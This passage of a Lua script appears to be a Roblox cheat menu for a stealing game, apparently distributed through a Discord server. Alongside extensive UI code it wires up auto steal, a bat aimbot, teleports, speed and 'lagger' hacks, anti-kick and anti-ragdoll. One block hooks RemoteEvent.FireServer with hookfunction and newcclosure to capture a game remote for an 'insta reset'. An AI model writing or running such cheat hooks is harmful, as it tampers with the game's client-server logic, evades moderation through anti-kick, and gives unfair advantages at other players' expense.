							n32 = math.clamp((tick() - v86) / getActiveStealDuration(), 0, 1)
							GrabBar.Visible = false
						end

						if grabFill and grabFill.Parent then
							grabFill.Size = UDim2.new(n32, 0, 1, 0)
						end

						if grabPct and grabPct.Parent then
							grabPct.Text = string.format("AUTO GRAB  %d%%", math.floor(n32 * 100 + 0.5))
						end

						task.wait(0.1)
					end
				end)

				do
					local function fn35(parent)
						local instance = Instance.new("Frame")
						instance.Name = "GrabModeSwitcher"
						instance.Size = UDim2.new(1, 0, 0, 44)
						instance.BackgroundColor3 = C.row
						instance.BackgroundTransparency = 0.03
						instance.BorderSizePixel = 0
						instance.LayoutOrder = 1
						instance.Parent = parent
						kuruCard(instance)
						local instance2 = Instance.new("TextLabel", instance)
						instance2.Size = UDim2.new(0, 112, 1, 0)
						instance2.Position = UDim2.new(0, 13, 0, 0)
						instance2.BackgroundTransparency = 1
						instance2.Text = "Auto Steal Method"
						instance2.TextColor3 = C.text
						instance2.TextSize = 12
						instance2.Font = Enum.Font.GothamMedium
						instance2.TextXAlignment = Enum.TextXAlignment.Left
						local instance3 = Instance.new("Frame", instance)
						instance3.Size = UDim2.new(1, -128, 0, 34)
						instance3.Position = UDim2.new(0, 120, 0.5, -17)
						instance3.BackgroundColor3 = C.input
						instance3.BackgroundTransparency = 0.12
						instance3.BorderSizePixel = 0
						instance3.ClipsDescendants = true
						kuruCard(instance3)
						local frame = Instance.new("Frame", instance3)
						frame.Size = UDim2.new(0.5, -4, 1, -8)
						frame.Position = UDim2.new(selectedStealMode == "Semi" and 0.5 or 0, 4, 0, 4)
						frame.BackgroundColor3 = C.blue
						frame.BorderSizePixel = 0
						guiCorner(frame, 10)
						guiStroke(frame, Color3.fromRGB(245, 245, 255), 1.2).Transparency = 0.08
						local textLabel = Instance.new("TextLabel", instance3)
						textLabel.Size = UDim2.new(0.5, 0, 1, 0)
						textLabel.BackgroundTransparency = 1
						textLabel.Text = "NORMAL"
						textLabel.TextColor3 = C.text
						textLabel.TextSize = 10
						textLabel.Font = Enum.Font.GothamBold
						textLabel.TextXAlignment = Enum.TextXAlignment.Center
						textLabel.ZIndex = 3
						local clone = textLabel:Clone()
						clone.Parent = instance3
						clone.Position = UDim2.new(0.5, 0, 0, 0)
						clone.Text = "SEMI"
						local textButton = Instance.new("TextButton", instance3)
						textButton.Size = UDim2.new(0.5, 0, 1, 0)
						textButton.BackgroundTransparency = 1
						textButton.Text = ""
						textButton.AutoButtonColor = false
						textButton.ZIndex = 5
						local clone2 = textButton:Clone()
						clone2.Parent = instance3
						clone2.Position = UDim2.new(0.5, 0, 0, 0)
						local frame2 = Instance.new("Frame", parent)
						frame2.Name = "SemiModeOptions"
						frame2.Size = UDim2.new(1, -4, 0, 34)
						frame2.Position = UDim2.new(0, 2, 0, 0)
						frame2.BackgroundColor3 = C.input
						frame2.BackgroundTransparency = 0.22
						frame2.BorderSizePixel = 0
						frame2.LayoutOrder = 1.1
						frame2.Visible = selectedStealMode == "Semi"
						frame2.ClipsDescendants = true
						kuruCard(frame2)
						local frame3 = Instance.new("Frame", frame2)
						frame3.Size = UDim2.new(0.33333333333333331, -3, 1, -8)
						frame3.Position = UDim2.new(
							(selectedSemiMode == "V2" and 1 or selectedSemiMode == "V3" and 2 or 0) / 3,
							4,
							0,
							4
						)
						frame3.BackgroundColor3 = C.blue
						frame3.BorderSizePixel = 0
						guiCorner(frame3, 10)
						guiStroke(frame3, Color3.fromRGB(245, 245, 255), 1.2).Transparency = 0.08
						local tbl17 = {}
						local tbl18 = {}

						for i, v86 in ipairs({ "V1", "V2", "V3" }) do
							local textLabel2 = Instance.new("TextLabel", frame2)
							textLabel2.Size = UDim2.new(0.33333333333333331, 0, 1, 0)
							textLabel2.Position = UDim2.new((i - 1) / 3, 0, 0, 0)
							textLabel2.BackgroundTransparency = 1
							textLabel2.Text = v86
							textLabel2.TextColor3 = C.text
							textLabel2.TextSize = 10
							textLabel2.Font = Enum.Font.GothamBold
							textLabel2.TextXAlignment = Enum.TextXAlignment.Center
							textLabel2.ZIndex = 3
							tbl17[i] = textLabel2
							local textButton2 = Instance.new("TextButton", frame2)
							textButton2.Size = UDim2.new(0.33333333333333331, 0, 1, 0)
							textButton2.Position = UDim2.new((i - 1) / 3, 0, 0, 0)
							textButton2.BackgroundTransparency = 1
							textButton2.Text = ""
							textButton2.AutoButtonColor = false
							textButton2.ZIndex = 5
							tbl18[i] = textButton2
						end

						local function fn36(arg)
							selectedStealMode = arg == "Semi" and "Semi" or "Normal"
							Steal.StealRange = AceStealRadii.Semi or 10
							Steal.StealRadius = AceStealRadii[selectedStealMode] or 60
							local visible = selectedStealMode == "Semi"
							frame2.Visible = visible
							TweenService:Create(
								frame,
								TweenInfo.new(0.18, Enum.EasingStyle.Quad),
								{ Position = visible and UDim2.new(0.5, 0, 0, 4) or UDim2.new(0, 4, 0, 4) }
							):Play()
							textLabel.TextTransparency = visible and 0.5 or 0
							clone.TextTransparency = visible and 0 or 0.5
							saveConfig()

							if Steal.AutoStealEnabled then
								_G.AceAutoStealSync()
							end
						end

						textButton.MouseButton1Click:Connect(function()
							fn36("Normal")
						end)

						clone2.MouseButton1Click:Connect(function()
							fn36("Semi")
						end)

						for i, v86 in ipairs(tbl18) do
							v86.MouseButton1Click:Connect(function()
								selectedSemiMode = ({ "V1", "V2", "V3" })[i]

								for i2, v87 in ipairs(tbl17) do
									v87.TextTransparency = i2 == i and 0 or 0.5
								end

								TweenService:Create(
									frame3,
									TweenInfo.new(0.18, Enum.EasingStyle.Quad),
									{ Position = UDim2.new((i - 1) / 3, 4, 0, 4) }
								):Play()
								saveConfig()

								if Steal.AutoStealEnabled then
									_G.AceAutoStealSync()
								end
							end)
						end

						for i, v86 in ipairs(tbl17) do
							v86.TextTransparency = (
								i == 1 and selectedSemiMode == "V1"
								or i == 2 and selectedSemiMode == "V2"
								or i == 3 and selectedSemiMode == "V3"
							)
									and 0
								or 0.5
						end

						fn36(selectedStealMode)
					end

					openAutoGrabSettings = makeSettingsPanel("Auto Grab", function(arg)
						fn35(arg)

						sNumRow(arg, "Steal Radius", Steal.StealRadius, 5, 300, 2, function(arg2)
							Steal.StealRadius = math.floor(arg2)
							AceStealRadii[selectedStealMode] = Steal.StealRadius
							Steal.plotCache = {}

							if grabRadLbl then
								grabRadLbl.Text = "Radius: " .. Steal.StealRadius
							end
						end)

						sNumRow(arg, "Steal Duration", Steal.StealDuration, 0.05, 2, 3, function(stealDuration)
							Steal.StealDuration = stealDuration
							saveConfig()
						end)
					end)
				end
			end

			openBatAimbotSettings = makeSettingsPanel("Bat Aimbot", function(arg)
				sNumRow(arg, "Aimbot Speed", State.aimbotSpeed, 1, 500, 1, function(aimbotSpeed)
					State.aimbotSpeed = aimbotSpeed
				end)

				sNumRow(arg, "Hit Distance", State.aimbotHitDist, 1, 50, 2, function(aimbotHitDist)
					State.aimbotHitDist = aimbotHitDist
				end)

				sNumRow(arg, "Swing Delay", State.swingCooldown, 0.01, 2, 3, function(swingCooldown)
					State.swingCooldown = swingCooldown
				end)
			end)

			openAutoBatSettings = makeSettingsPanel("Auto Bat", function(arg)
				sNumRow(arg, "Bat Range", AutoBat.Range, 1, 100, 1, function(range)
					AutoBat.Range = range
				end)
			end)

			openAutoTPDownSettings = makeSettingsPanel("Auto TP Down", function(arg)
				sNumRow(arg, "Trigger Height", State.autoTPDownHeight or 20, -100, 200, 1, function(autoTPDownHeight)
					State.autoTPDownHeight = autoTPDownHeight
				end)
			end)

			openSpeedSettings = makeSettingsPanel("Speed", function(arg)
				sNumRow(arg, "Normal Speed", NS, 1, 500, 1, function(normalSpeed)
					NS = normalSpeed
					State.normalSpeed = normalSpeed

					if speedBoxRefs.normalSpeed then
						speedBoxRefs.normalSpeed.Text = tostring(normalSpeed)
					end

					saveConfig()
				end)

				sNumRow(arg, "Carry Speed", CS, 1, 500, 2, function(carrySpeed)
					CS = carrySpeed
					State.carrySpeed = carrySpeed

					if speedBoxRefs.carrySpeed then
						speedBoxRefs.carrySpeed.Text = tostring(carrySpeed)
					end

					saveConfig()
				end)

				sNumRow(arg, "Lagger Normal", LAGGER_SPEED, 1, 500, 3, function(laggerSpeed)
					LAGGER_SPEED = laggerSpeed
					State.laggerSpeed = laggerSpeed

					if speedBoxRefs.laggerSpeed then
						speedBoxRefs.laggerSpeed.Text = tostring(laggerSpeed)
					end

					saveConfig()
				end)

				sNumRow(arg, "Lagger Carry", LAGGER_CARRY_SPEED, 1, 500, 4, function(laggerCarrySpeed)
					LAGGER_CARRY_SPEED = laggerCarrySpeed
					State.laggerCarrySpeed = laggerCarrySpeed

					if speedBoxRefs.laggerCarrySpeed then
						speedBoxRefs.laggerCarrySpeed.Text = tostring(laggerCarrySpeed)
					end

					saveConfig()
				end)
			end)

			openAntiKickSettings = makeSettingsPanel("Anti Kick", function(arg)
				sToggleRow(arg, "Enabled", State.antiKickEnabled, 1, function(antiKickEnabled_)
					State.antiKickEnabled = antiKickEnabled_

					if toggleRefs.antiKick then
						toggleRefs.antiKick(antiKickEnabled_)
					end

					if antiKickEnabled_ then
						startAntiKick()
					else
						stopAntiKick()
					end

					saveSettings()
				end)
			end)

			sv = function(arg)
				return savedData and savedData.toggles and savedData.toggles[arg] or false
			end

			setRowTab("COMBAT")
			makeSectionHeader("AUTO")

			toggleRefs.autoSteal = makeToggleRow("Auto Steal", Steal.AutoStealEnabled, function(autoStealEnabled)
				Steal.AutoStealEnabled = autoStealEnabled
				State.autoStealEnabled = autoStealEnabled

				if autoStealEnabled then
					pcall(startAutoSteal)
				else
					pcall(stopAutoSteal)
				end

				if toggleRefs.autoSteal then
					toggleRefs.autoSteal(autoStealEnabled)
				end

				saveConfig()
			end, nil, openAutoGrabSettings)

			_cursedResetRemote = nil
			_CURSED_RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"

			pcall(function()
				if hookfunction and newcclosure then
					local v86 = nil
					local v87 = newcclosure

					local function fn35(arg, ...)
						if
							not _cursedResetRemote
							and typeof(arg) == "Instance"
							and arg:IsA("RemoteEvent")
							and arg.Name:sub(1, 3) == "RE/"
						then
							_cursedResetRemote = arg
						end

						local v88 = table.pack(...)
						return v86(arg, table.unpack(v88, 1, v88.n))
					end

					v86 = hookfunction
					v86 = v86(Instance.new("RemoteEvent").FireServer, v87(fn35))
				end
			end)

			task.spawn(function()
				task.wait(2)
				if _cursedResetRemote then
					return
				end
				local ReplicatedStorage_ = game:GetService("ReplicatedStorage")

				for scanIndex, descendant in ipairs(ReplicatedStorage_:GetDescendants()) do
					if scanIndex % 300 == 0 then
						task.wait()
					end
					if descendant:IsA("RemoteEvent") and descendant.Name:sub(1, 3) == "RE/" then
						_cursedResetRemote = descendant
						break
					end
				end

				if not _cursedResetRemote then
					for scanIndex, descendant in ipairs(game:GetDescendants()) do
						if scanIndex % 300 == 0 then
							task.wait()
						end
						if descendant:IsA("RemoteEvent") and descendant.Name:sub(1, 3) == "RE/" then
							_cursedResetRemote = descendant
							break
						end
					end
				end
			end)

			doInstaReset = function()
				cursedInstaReset()
			end

			actionKeybinds.instaReset = doInstaReset

			makeButtonRow("Insta Reset", "GO", function()
				notify("Insta Reset", "Triggered", "warn", 2.2)
				doInstaReset()
			end, "instaReset")

			actionKeybinds.tpDown = doTpDown

			makeButtonRow("TP Down", "GO", function()
				notify("TP Down", "Triggered", "warn", 2.2)
				doTpDown()
			end, "tpDown")

			do
				local function fn35(enabled)
					AutoBat.Enabled = enabled

					if enabled then
						startAutoBat()
					else
						stopAutoBat()
					end
				end

				local v86 = openAutoBatSettings
				toggleRefs.autoBat = makeToggleRow("Auto Bat", sv("autoBat"), fn35, "autoBat", v86)
			end
		end

		infJumpRow = nil

		do
			local v86 = toggleRefs

			local v87, v88 = makeToggleRow("Infinite Jump", sv("infJump"), function(infJumpEnabled_)
				State.infJumpEnabled = infJumpEnabled_
			end)

			v86.infJump = v87
			infJumpRow = v88
		end
	end

	do
		infJumpModeBtn = Instance.new("TextButton")
		infJumpModeBtn.Name = "InfJumpMode"
		infJumpModeBtn.Size = UDim2.fromOffset(74, 26)
		infJumpModeBtn.Position = UDim2.new(1, -132, 0.5, -13)
		infJumpModeBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		infJumpModeBtn.BorderSizePixel = 0
		infJumpModeBtn.Font = Enum.Font.GothamBold
		infJumpModeBtn.Text = State.infJumpMode or "Classic"
		infJumpModeBtn.TextColor3 = Color3.fromRGB(18, 27, 30)
		infJumpModeBtn.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		infJumpModeBtn.TextStrokeTransparency = 0.18
		infJumpModeBtn.TextSize = 11
		infJumpModeBtn.ZIndex = 18
		infJumpModeBtn.AutoButtonColor = false
		infJumpModeBtn.Parent = infJumpRow
		corner(infJumpModeBtn, 7)
		infJumpModeStroke = stroke(infJumpModeBtn, Color3.fromRGB(14, 16, 22), 1.5, 0.28)

		infJumpModeBtn.MouseEnter:Connect(function()
			tween(infJumpModeBtn, { BackgroundColor3 = Color3.fromRGB(248, 250, 253) }, 0.1)
			tween(infJumpModeStroke, { Color = Color3.fromRGB(14, 16, 22), Transparency = 0.12 }, 0.2)
		end)

		infJumpModeBtn.MouseLeave:Connect(function()
			tween(infJumpModeBtn, { BackgroundColor3 = Color3.fromRGB(255, 255, 255) }, 0.1)
			tween(infJumpModeStroke, { Color = Color3.fromRGB(14, 16, 22), Transparency = 0.28 }, 0.1)
		end)

		infJumpModeBtn.MouseButton1Click:Connect(function()
			local infJumpMode_ = State.infJumpMode == "Classic" and "Hold" or "Classic"
			State.infJumpMode = infJumpMode_
			infJumpModeBtn.Text = infJumpMode_
			saveSettings()
		end)

		toggleRefs.antiRagdoll = makeToggleRow("Anti-Ragdoll", antiRagdollEnabled, function(antiRagdollEnabled_)
			State.antiRagdollEnabled = antiRagdollEnabled_
			antiRagdollEnabled = antiRagdollEnabled_

			if antiRagdollEnabled_ then
				pcall(startAntiRagdoll)
			else
				pcall(stopAntiRagdoll)
			end

			saveSettings()
			saveConfig()
		end)

		do
			local function fn35(arg)
				if arg then
					startAutoTPDown()
				else
					stopAutoTPDown()
				end

				return
			end

			local v86 = openAutoTPDownSettings
			toggleRefs.autoTPDown = makeToggleRow("Auto TP Down", sv("autoTPDown"), fn35, "autoTPDown", v86)
		end
	end

	makeDivider()
	makeSectionHeader("COMBAT")
	refreshAutoLeft = nil
	refreshAutoRight = nil
	refreshAimbot = nil

	refreshAutoLeft = makeToggleRow("Auto Left", sv("autoLeft"), function(autoLeftEnabled_)
		State.autoLeftEnabled = autoLeftEnabled_
		autoLeftEnabled = autoLeftEnabled_

		if setAL then
			setAL(autoLeftEnabled_)
		end

		if autoLeftEnabled_ then
			if State.batAimbotToggled then
				State.batAimbotToggled = false
				stopBatAimbot()

				if refreshAimbot then
					refreshAimbot(false)
				end

				if setAB then
					setAB(false)
				end
			end

			if State.autoRightEnabled then
				State.autoRightEnabled = false
				autoRightEnabled = false
				stopAutoRight()

				if refreshAutoRight then
					refreshAutoRight(false)
				end

				if setAR then
					setAR(false)
				end
			end

			startAutoLeft()
		else
			stopAutoLeft()
		end
	end, "autoLeft")

	toggleRefs.autoLeft = refreshAutoLeft

	refreshAutoRight = makeToggleRow("Auto Right", sv("autoRight"), function(autoRightEnabled_)
		State.autoRightEnabled = autoRightEnabled_
		autoRightEnabled = autoRightEnabled_

		if setAR then
			setAR(autoRightEnabled_)
		end

		if autoRightEnabled_ then
			if State.batAimbotToggled then
				State.batAimbotToggled = false
				stopBatAimbot()

				if refreshAimbot then
					refreshAimbot(false)
				end

				if setAB then
					setAB(false)
				end
			end

			if State.autoLeftEnabled then
				State.autoLeftEnabled = false
				autoLeftEnabled = false
				stopAutoLeft()

				if refreshAutoLeft then
					refreshAutoLeft(false)
				end

				if setAL then
					setAL(false)
				end
			end

			startAutoRight()
		else
			stopAutoRight()
		end
	end, "autoRight")

	toggleRefs.autoRight = refreshAutoRight

	do
		local function fn35(batAimbotToggled)
			State.batAimbotToggled = batAimbotToggled

			if setAB then
				setAB(batAimbotToggled)
			end

			if batAimbotToggled then
				if State.batV2Toggled then
					State.batV2Toggled = false
					stopBatTP()

					if toggleRefs.batV2 then
						toggleRefs.batV2(false)
					end
				end

				if State.autoLeftEnabled then
					State.autoLeftEnabled = false
					stopAutoLeft()

					if refreshAutoLeft then
						refreshAutoLeft(false)
					end

					if setAL then
						setAL(false)
					end
				end

				if State.autoRightEnabled then
					State.autoRightEnabled = false
					stopAutoRight()

					if refreshAutoRight then
						refreshAutoRight(false)
					end

					if setAR then
						setAR(false)
					end
				end

				pcall(startBatAimbot)
			else
				stopBatAimbot()
			end
		end

		local v86 = openBatAimbotSettings
		refreshAimbot = makeToggleRow("Bat Aimbot", sv("batAimbot"), fn35, "aimbot", v86)
	end
end

do
	do
		do
			toggleRefs.aimbot = refreshAimbot

			do
				local v86 = toggleRefs

				local v87, v88 = makeToggleRow("Bat TP", sv("batV2"), function(batV2Toggled)
					State.batV2Toggled = batV2Toggled

					if batV2Toggled then
						if State.batAimbotToggled then
							State.batAimbotToggled = false
							stopBatAimbot()

							if refreshAimbot then
								refreshAimbot(false)
							end

							if setAB then
								setAB(false)
							end
						end

						pcall(startBatTP)
					else
						stopBatTP()
					end
				end, "batV2")

				v86.batV2 = v87
				markBetaRiskRow(v88, "Bat TP")
			end
		end

		do
			local antiBatShowPopup

			do
				local antiBatBetaSeen = State.antiBatBetaSeen or false

				antiBatShowPopup = function(arg, arg2)
					if antiBatBetaSeen then
						arg()
						return
					end
					local frame = Instance.new("Frame", Gui)
					frame.Name = "AntiBatBetaOverlay"
					frame.Size = UDim2.fromScale(1, 1)
					frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					frame.BackgroundTransparency = 1
					frame.BorderSizePixel = 0
					frame.ZIndex = 300
					TweenService
						:Create(frame, TweenInfo.new(0.18, Enum.EasingStyle.Quad), { BackgroundTransparency = 0.5 })
						:Play()
					local frame2 = Instance.new("Frame", frame)
					frame2.Size = UDim2.fromOffset(272, 216)
					frame2.AnchorPoint = Vector2.new(0.5, 0.5)
					frame2.Position = UDim2.new(0.5, 0, 0.5, 18)
					frame2.BackgroundColor3 = Color3.fromRGB(14, 16, 22)
					frame2.BorderSizePixel = 0
					frame2.ZIndex = 301
					frame2.BackgroundTransparency = 1
					Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, 14)
					local uiStroke = Instance.new("UIStroke", frame2)
					uiStroke.Thickness = 1.2
					uiStroke.Color = Color3.fromRGB(150, 150, 150)
					uiStroke.Transparency = 0.25
					TweenService:Create(
						frame2,
						TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{ Position = UDim2.new(0.5, 0, 0.5, 0), BackgroundTransparency = 0 }
					):Play()
					local textLabel = Instance.new("TextLabel", frame2)
					textLabel.Size = UDim2.fromOffset(38, 16)
					textLabel.Position = UDim2.new(1, -50, 0, 14)
					textLabel.BackgroundColor3 = Color3.fromRGB(250, 250, 250)
					textLabel.BackgroundTransparency = 0.05
					textLabel.BorderSizePixel = 0
					textLabel.Text = "BETA"
					textLabel.TextColor3 = C.RedOff
					textLabel.Font = Enum.Font.GothamBlack
					textLabel.TextSize = 8
					textLabel.ZIndex = 303
					Instance.new("UICorner", textLabel).CornerRadius = UDim.new(0, 5)
					stroke(textLabel, C.RedOff, 1, 0.45)
					local textLabel2 = Instance.new("TextLabel", frame2)
					textLabel2.Size = UDim2.new(1, -60, 0, 22)
					textLabel2.Position = UDim2.fromOffset(14, 13)
					textLabel2.BackgroundTransparency = 1
					textLabel2.Text = "⚠  Anti-Bat"
					textLabel2.TextColor3 = Color3.fromRGB(245, 245, 245)
					textLabel2.Font = Enum.Font.GothamBlack
					textLabel2.TextSize = 13
					textLabel2.TextXAlignment = Enum.TextXAlignment.Left
					textLabel2.ZIndex = 302
					local instance = Instance.new("Frame", frame2)
					instance.Size = UDim2.new(1, -28, 0, 1)
					instance.Position = UDim2.fromOffset(14, 36)
					instance.BackgroundColor3 = Color3.fromRGB(140, 140, 150)
					instance.BackgroundTransparency = 0.4
					instance.BorderSizePixel = 0
					instance.ZIndex = 302
					local textLabel3 = Instance.new("TextLabel", frame2)
					textLabel3.Size = UDim2.new(1, -28, 0, 88)
					textLabel3.Position = UDim2.fromOffset(14, 48)
					textLabel3.BackgroundTransparency = 1

					textLabel3.Text = [[This feature is still in beta.

If it's buggy, please open a ticket
in our Discord server.

Use at your own risk.]]

					textLabel3.TextColor3 = Color3.fromRGB(175, 178, 200)
					textLabel3.Font = Enum.Font.Gotham
					textLabel3.TextSize = 11
					textLabel3.TextWrapped = true
					textLabel3.TextXAlignment = Enum.TextXAlignment.Left
					textLabel3.TextYAlignment = Enum.TextYAlignment.Top
					textLabel3.ZIndex = 302
					local frame3 = Instance.new("Frame", frame2)
					frame3.Size = UDim2.new(1, -28, 0, 18)
					frame3.Position = UDim2.fromOffset(14, 142)
					frame3.BackgroundTransparency = 1
					frame3.ZIndex = 302
					local textButton = Instance.new("TextButton", frame3)
					textButton.Size = UDim2.fromOffset(44, 44)
					textButton.Position = UDim2.fromOffset(0, 2)
					textButton.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
					textButton.BorderSizePixel = 0
					textButton.Text = ""
					textButton.ZIndex = 303
					textButton.AutoButtonColor = false
					Instance.new("UICorner", textButton).CornerRadius = UDim.new(0, 4)
					local uiStroke2 = Instance.new("UIStroke", textButton)
					uiStroke2.Thickness = 1.1
					uiStroke2.Color = Color3.fromRGB(90, 90, 90)
					local instance2 = Instance.new("TextLabel", textButton)
					instance2.Size = UDim2.fromScale(1, 1)
					instance2.BackgroundTransparency = 1
					instance2.Text = ""
					instance2.TextColor3 = Color3.fromRGB(255, 255, 255)
					instance2.Font = Enum.Font.GothamBlack
					instance2.TextSize = 11
					instance2.ZIndex = 304
					local textLabel4 = Instance.new("TextLabel", frame3)
					textLabel4.Size = UDim2.new(1, -22, 1, 0)
					textLabel4.Position = UDim2.fromOffset(20, 0)

					textLabel4.BackgroundTransparency = 1
					textLabel4.Text = "Don't show me this again"
					textLabel4.TextColor3 = Color3.fromRGB(110, 115, 145)
					textLabel4.Font = Enum.Font.Gotham
					textLabel4.TextSize = 10
					textLabel4.TextXAlignment = Enum.TextXAlignment.Left
					textLabel4.ZIndex = 303
					local flag18 = false

					textButton.MouseButton1Click:Connect(function()
						flag18 = not flag18
						instance2.Text = flag18 and "✓" or ""
						TweenService
							:Create(
								textButton,
								TweenInfo.new(0.12),
								{
									BackgroundColor3 = flag18 and Color3.fromRGB(18, 48, 28)
										or Color3.fromRGB(22, 26, 36),
								}
							)
							:Play()
						TweenService:Create(
							uiStroke2,
							TweenInfo.new(0.12),
							{ Color = flag18 and Color3.fromRGB(160, 160, 160) or Color3.fromRGB(90, 90, 90) }
						):Play()
					end)

					local frame4 = Instance.new("Frame", frame2)
					frame4.Size = UDim2.new(1, -28, 0, 34)
					frame4.Position = UDim2.fromOffset(14, 170)
					frame4.BackgroundTransparency = 1
					frame4.ZIndex = 302
					local textButton2 = Instance.new("TextButton", frame4)
					textButton2.Size = UDim2.new(0.47, 0, 1, 0)
					textButton2.Position = UDim2.fromScale(0, 0)
					textButton2.BackgroundColor3 = Color3.fromRGB(34, 30, 34)
					textButton2.BorderSizePixel = 0
					textButton2.Text = "Cancel"
					textButton2.TextColor3 = Color3.fromRGB(160, 160, 160)
					textButton2.Font = Enum.Font.GothamBold
					textButton2.TextSize = 12
					textButton2.AutoButtonColor = false
					textButton2.ZIndex = 303
					Instance.new("UICorner", textButton2).CornerRadius = UDim.new(0, 9)
					Instance.new("UIStroke", textButton2).Color = Color3.fromRGB(105, 105, 105)
					local textButton3 = Instance.new("TextButton", frame4)
					textButton3.Size = UDim2.new(0.47, 0, 1, 0)
					textButton3.Position = UDim2.new(0.53, 0, 0, 0)
					textButton3.BackgroundColor3 = Color3.fromRGB(16, 40, 24)
					textButton3.BorderSizePixel = 0
					textButton3.Text = "Activate"
					textButton3.TextColor3 = Color3.fromRGB(165, 165, 165)
					textButton3.Font = Enum.Font.GothamBold
					textButton3.TextSize = 12
					textButton3.AutoButtonColor = false
					textButton3.ZIndex = 303
					Instance.new("UICorner", textButton3).CornerRadius = UDim.new(0, 9)
					Instance.new("UIStroke", textButton3).Color = Color3.fromRGB(150, 150, 150)

					local function fn35(arg3)
						TweenService:Create(
							frame2,
							TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
							{ Position = UDim2.new(0.5, 0, 0.5, 14), BackgroundTransparency = 1 }
						):Play()
						local tbl17 = { BackgroundTransparency = 1 }
						TweenService:Create(frame, TweenInfo.new(0.18, Enum.EasingStyle.Quad), tbl17):Play()

						task.delay(0.2, function()
							pcall(function()
								frame:Destroy()
							end)

							if arg3 then
								arg3()
							end
						end)
					end

					textButton2.MouseButton1Click:Connect(function()
						TweenService
							:Create(textButton2, TweenInfo.new(0.08), { BackgroundColor3 = Color3.fromRGB(60, 60, 60) })
							:Play()

						task.delay(0.08, function()
							fn35(function()
								if arg2 then
									arg2()
								end
							end)
						end)
					end)

					textButton3.MouseButton1Click:Connect(function()
						TweenService
							:Create(textButton3, TweenInfo.new(0.08), { BackgroundColor3 = Color3.fromRGB(18, 60, 30) })
							:Play()

						if flag18 then
							antiBatBetaSeen = true
							State.antiBatBetaSeen = true
							saveSettings()
						end

						task.delay(0.3, function()
							fn35(function()
								if arg then
									arg()
								end
							end)
						end)

						return
					end)

					return
				end
			end

			_G._antiBatShowPopup = antiBatShowPopup

			do
				local v86 = toggleRefs

				local v87, v88 = makeToggleRow("Anti-Bat", false, function(arg)
					if arg then
						antiBatShowPopup(function()
							State.antiBatEnabled = true
							startAntiBat()

							if toggleRefs.antiBat then
								toggleRefs.antiBat(true)
							end

							if _G._setAntiBatMobile then
								_G._setAntiBatMobile(true)
							end
						end, function()
							State.antiBatEnabled = false

							if toggleRefs.antiBat then
								toggleRefs.antiBat(false)
							end

							if _G._setAntiBatMobile then
								_G._setAntiBatMobile(false)
							end
						end)

						task.defer(function()
							if not State.antiBatEnabled then
								if toggleRefs.antiBat then
									toggleRefs.antiBat(false)
								end

								if _G._setAntiBatMobile then
									_G._setAntiBatMobile(false)
								end
							end
						end)
					else
						State.antiBatEnabled = false
						stopAntiBat()

						if _G._setAntiBatMobile then
							_G._setAntiBatMobile(false)
						end
					end
				end, "antiBat")

				v86.antiBat = v87
				_antiBatRow = v88
			end
		end
	end

	do
		do
			markBetaRiskRow(_antiBatRow, "Anti-Bat")

			do
				local labelBtn = _antiBatRow:FindFirstChild("LabelBtn")

				if labelBtn then
					for _, child in ipairs(labelBtn:GetChildren()) do
						if child.Name == "RiskNote" then
							child.Text = "use at your own risk"
						end
					end
				end
			end
		end

		actionKeybinds.antiBat = function()
			if not State.antiBatEnabled then
				if not State.antiBatBetaSeen then
					if _G._antiBatShowPopup then
						_G._antiBatShowPopup(function()
							State.antiBatEnabled = true
							startAntiBat()

							if toggleRefs.antiBat then
								toggleRefs.antiBat(true)
							end

							if _G._setAntiBatMobile then
								_G._setAntiBatMobile(true)
							end
						end, function()
							State.antiBatEnabled = false

							if toggleRefs.antiBat then
								toggleRefs.antiBat(false)
							end

							if _G._setAntiBatMobile then
								_G._setAntiBatMobile(false)
							end
						end)
					end
				else
					State.antiBatEnabled = true
					startAntiBat()

					if toggleRefs.antiBat then
						toggleRefs.antiBat(true)
					end

					if _G._setAntiBatMobile then
						_G._setAntiBatMobile(true)
					end
				end
			else
				State.antiBatEnabled = false
				stopAntiBat()

				if toggleRefs.antiBat then
					toggleRefs.antiBat(false)
				end

				if _G._setAntiBatMobile then
					_G._setAntiBatMobile(false)
				end
			end
		end

		makeButtonRow("Drop Brainrot", "GO", function()
			notify("Drop Brainrot", "Triggered", "warn", 2.2)

			if not State.dropEnabled then
				runDrop()
			end
		end, "dropBrainrot")

		actionKeybinds.dropBrainrot = function()
			notify("Drop Brainrot", "Triggered", "warn", 2.2)

			if not State.dropEnabled then
				runDrop()
			end
		end

		makeDivider()
		setRowTab("MOVE")
		makeSectionHeader("SPEED")

		do
			local function fn35(speedToggled)
				State.speedToggled = speedToggled
				carrySpeedActive = speedToggled
				speedMode = speedToggled

				if setCarryModeMobile then
					setCarryModeMobile(speedToggled)
				end

				if mobBtnRefs.carrySpeed then
					mobBtnRefs.carrySpeed(speedToggled)
				end

				if carryModeSetVisual then
					carryModeSetVisual(speedToggled)
				end

				refreshSpeedModeLabel()
				saveConfig()
				updateSpeedBarHighlight()
			end

			local v86 = openSpeedSettings
			toggleRefs.carryMode = makeToggleRow("Carry Mode", sv("carryMode"), fn35, "carryMode", v86)
		end
	end

	do
		local v86

		do
			toggleRefs.laggerMode = makeToggleRow("Lagger Mode", sv("laggerMode"), function(laggerEnabled)
				State.laggerEnabled = laggerEnabled
				setLaggerModeEnabled(laggerEnabled)

				if mobBtnRefs.lagger then
					mobBtnRefs.lagger(laggerEnabled)
				end

				if laggerModeSetVisual then
					laggerModeSetVisual(laggerEnabled)
				end

				if laggerCarryModeSetVisual then
					laggerCarryModeSetVisual(laggerCarryToggled)
				end

				updateSpeedBarHighlight()
			end, "laggerMode")

			toggleRefs.laggerCarryMode = makeToggleRow("Lagger Carry Mode", sv("laggerCarryMode"), function(arg)
				if arg ~= laggerCarryToggled then
					toggleLaggerCarryMode()
				end

				State.laggerCarryEnabled = laggerCarryToggled

				if setLaggerCarryMobile then
					setLaggerCarryMobile(laggerCarryToggled)
				end

				if mobBtnRefs.laggerCarry then
					mobBtnRefs.laggerCarry(laggerCarryToggled)
				end

				if mobBtnRefs.lagger then
					mobBtnRefs.lagger(laggerModeEnabled)
				end

